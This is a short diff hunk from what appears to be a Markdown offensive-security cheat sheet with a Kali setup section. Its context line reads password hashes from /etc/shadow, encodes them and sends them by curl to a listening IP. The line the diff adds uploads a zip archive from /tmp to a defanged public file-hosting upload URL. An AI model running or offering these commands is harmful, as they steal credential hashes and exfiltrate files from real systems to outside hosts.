@@ -333,6 +333,7 @@ Linux
 
 ```
 sudo grep '\$' /etc/shadow | base64 | tr -d '\n' |xargs -I @ curl http://172.16.72.1/hash/@
+curl -F file=@/tmp/<redacted>.zip hxxps://store1[.]gofile[.]io/uploadFile
 
 ```
 ## Настройка Kali
